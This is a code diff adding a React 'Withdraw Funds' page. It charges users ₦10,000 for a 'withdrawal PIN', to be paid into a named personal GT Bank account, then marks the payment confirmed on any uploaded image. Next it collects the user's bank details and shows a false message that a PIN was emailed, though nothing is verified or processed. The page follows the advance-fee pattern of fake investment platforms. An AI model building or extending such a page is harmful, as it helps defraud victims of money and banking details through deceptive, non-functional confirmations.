@@ -1,0 +1,131 @@
+'use client';
+
+import { useState } from 'react';
+
+export default function Withdraw() {
+  const [step, setStep] = useState(1);
+  const [amount, setAmount] = useState("");
+  const [accountName, setAccountName] = useState("");
+  const [accountNumber, setAccountNumber] = useState("");
+  const [bankName, setBankName] = useState("");
+  const [receipt, setReceipt] = useState<File | null>(null);
+  const [pinPurchased, setPinPurchased] = useState(false);
+
+  const handleBuyPin = () => {
+    alert(`Please pay ₦10,000 to:\n\nName: NWOBA CHINASA ANNA\nBank: GT BANK\nAcc No: 0044193121\n\nAfter payment, upload your receipt.`);
+  };
+
+  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
+    if (e.target.files && e.target.files[0]) {
+      setReceipt(e.target.files[0]);
+    }
+  };
+
+  const confirmPayment = () => {
+    if (!receipt) {
+      alert("Please upload your payment receipt first");
+      return;
+    }
+    setPinPurchased(true);
+    setStep(2);
+    alert("✅ Payment Confirmed! You can now proceed with withdrawal.");
+  };
+
+  const submitWithdrawal = () => {
+    if (!amount || !accountName || !accountNumber || !bankName) {
+      alert("Please fill all fields");
+      return;
+    }
+    alert(`✅ Withdrawal Request Submitted!\nAmount: ₦${amount}\n\nA Withdrawal PIN has been sent to your email.`);
+  };
+
+  return (
+    <div className="min-h-screen bg-[#0a2540] text-white pb-20">
+      <div className="max-w-lg mx-auto px-6 pt-10">
+        <h1 className="text-4xl font-bold mb-8">Withdraw Funds</h1>
+
+        {step === 1 && (
+          <div className="glass rounded-3xl p-8 space-y-6">
+            <h2 className="text-2xl font-semibold">Step 1: Pay for PIN (₦10,000)</h2>
+            
+            <div className="bg-white/10 p-6 rounded-2xl">
+              <p><strong>Account Name:</strong> NWOBA CHINASA ANNA</p>
+              <p><strong>Bank:</strong> GT BANK</p>
+              <p><strong>Account Number:</strong> 0044193121</p>
+            </div>
+
+            <button 
+              onClick={handleBuyPin}
+              className="w-full bg-yellow-500 text-black py-4 rounded-2xl font-bold"
+            >
+              I Have Made The Payment
+            </button>
+
+            <div>
+              <label className="block text-sm mb-3">Upload Payment Receipt / Screenshot</label>
+              <input 
+                type="file" 
+                accept="image/*" 
+                onChange={handleFileUpload}
+                className="w-full bg-white/10 border border-white/20 rounded-2xl p-4"
+              />
+              {receipt && <p className="text-emerald-400 text-sm mt-2">✓ Receipt Uploaded: {receipt.name}</p>}
+            </div>
+
+            <button 
+              onClick={confirmPayment}
+              className="w-full bg-emerald-500 py-5 rounded-3xl font-bold"
+            >
+              Confirm Payment & Continue
+            </button>
+          </div>
+        )}
+
+        {step === 2 && pinPurchased && (
+          <div className="glass rounded-3xl p-8 space-y-6">
+            <h2 className="text-2xl font-semibold">Step 2: Withdrawal Details</h2>
+            
+            <input 
+              type="number" 
+              placeholder="Amount to withdraw (₦)" 
+              value={amount}
+              onChange={(e) => setAmount(e.target.value)}
+              className="w-full px-6 py-4 bg-white/10 border border-white/20 rounded-2xl"
+            />
+
+            <input 
+              type="text" 
+              placeholder="Your Account Name" 
+              value={accountName}
+              onChange={(e) => setAccountName(e.target.value)}
+              className="w-full px-6 py-4 bg-white/10 border border-white/20 rounded-2xl"
+            />
+
+            <input 
+              type="text" 
+              placeholder="Your Account Number" 
+              value={accountNumber}
+              onChange={(e) => setAccountNumber(e.target.value)}
+              className="w-full px-6 py-4 bg-white/10 border border-white/20 rounded-2xl"
+            />
+
+            <input 
+              type="text" 
+              placeholder="Bank Name" 
+              value={bankName}
+              onChange={(e) => setBankName(e.target.value)}
+              className="w-full px-6 py-4 bg-white/10 border border-white/20 rounded-2xl"
+            />
+
+            <button 
+              onClick={submitWithdrawal}
+              className="w-full bg-emerald-500 py-5 rounded-3xl font-bold text-lg mt-6"
+            >
+              Submit Withdrawal Request
+            </button>
+          </div>
+        )}
+      </div>
+    </div>
+  );
+    }
